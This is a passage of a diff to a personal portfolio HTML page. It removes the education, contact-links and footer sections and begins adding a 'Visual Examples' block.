-                <p style="color: var(--text-muted); margin: 0;">Thesis: <a href="https://vak.gisnauka.ru/adverts-list/advert-card/117108" target="_blank" style="color: var(--accent-color);">"Intelligent informational measuring system for thermography-based diagnostic of technical objects based on artificial neural networks."</a> Research published on <a href="https://www.researchgate.net/profile/Roman-Girin/research" target="_blank" style="color: var(--accent-color);">ResearchGate</a>.</p>
-            </div>
-            <div class="edu-item">
-                <h3>Specialist Degree in Engineering</h3>
-                <span class="job-dates">Samara State Technical University, graduated 2002</span>
-            </div>
-        </section>
-
-        <section id="contact">
-            <h2>Connect</h2>
-            <div class="contact-links">
-                <a class="resume-btn" href="assets/Roman-Girin-Resume.pdf" target="_blank">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
-                    Download R&eacute;sum&eacute;
-                </a>
-                <a href="mailto:romangirin@gmail.com">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16v16H4z" opacity="0"/><path d="M22 6l-10 7L2 6"/><path d="M2 6h20v12H2z"/></svg>
-                    Email
-                </a>
-                <a href="https://www.linkedin.com/in/roman-girin-53422b1b/" target="_blank">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg>
-                    LinkedIn
-                </a>
-                <a href="https://github.com/RomanGirin" target="_blank">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
-                    GitHub
-                </a>
-                <a href="https://www.researchgate.net/profile/Roman-Girin/research" target="_blank">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M8 12h8M12 8v8"/></svg>
-                    ResearchGate
-                </a>
-            </div>
-        </section>
-
-        <footer>
-            &copy; 2026 Roman Girin &mdash; built with a little help from Claude Code.
-        </footer>
-    </div>
-</body>
-</html>
+        <!-- Visual Examples Section -->
+        <div style="background: #e6fffa; border-radius: 15px; padding: 40px; margin: 30px 0; border-left: 6px solid #319795;">
+            
